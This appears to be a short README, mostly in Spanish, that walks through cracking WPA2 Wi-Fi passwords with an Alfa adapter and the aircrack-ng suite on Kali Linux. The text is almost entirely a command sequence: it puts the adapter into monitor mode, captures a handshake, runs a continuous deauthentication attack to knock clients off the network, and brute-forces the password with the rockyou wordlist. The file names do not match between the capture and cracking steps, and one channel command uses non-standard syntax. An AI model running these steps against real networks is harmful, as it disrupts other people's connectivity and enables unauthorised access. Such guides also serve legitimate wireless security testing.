# Alfa AWUS036AC
    
   Cracking WPA2


### WiFi Passwords

  ![](Wifi-Hacking.png)
  
## Requisitos

Antes de nada, deberíamos de instalar los drivers necesarios de la antena ya que sin ellos no podremos usar el modo monitor.
En este caso he usado el diccionario Rockyou que viene preinstalado en kali linux.


  ![](Alfa-AWUS036AC.png)



## Comandos Utilizados:
    
   Ver versión del sistema:
        
       cat /etc/os-release
       
       uname -a
   
   Ver interfaces:
   
       iwconfig
   
   Matar procesos:
    
       sudo airmon-ng check kill

   Iniciar modo monitor:
   
       sudo airmon-ng start wlan0
       
   Verificar que modo está en uso:
   
       sudo airmon-ng
       iwconfig
   
   Obtener dirección MAC y el canal del AP:
   
       sudo airodump-ng wlan0
       sudo airodump-ng -w hack1 -c 2 --bssid 00:00:00:00:00:00 wlan0 
    
   2nd Window - deauth attack:
   
       sudo aireplay-ng --deauth 0 -a 00:00:00:00:00:00 wlan0
   
   Abrir Wireshark para analizar el archivo capturado:
   
       wireshark hack1-01.cap
   
   Filtro de mensajes usado en wireshark:
   
       eapol
   
   Stop modo monitor:
   
       airmon-ng stop wlan0

   Cambiar canal:
   
       sudo airmon-ng wlan0 channel X

   Fuerza bruta:
   
       sudo aircrack-ng capture1-01.cap -w /usr/share/wordlists/rockyou.txt


# How To

![](Imagen1.png)

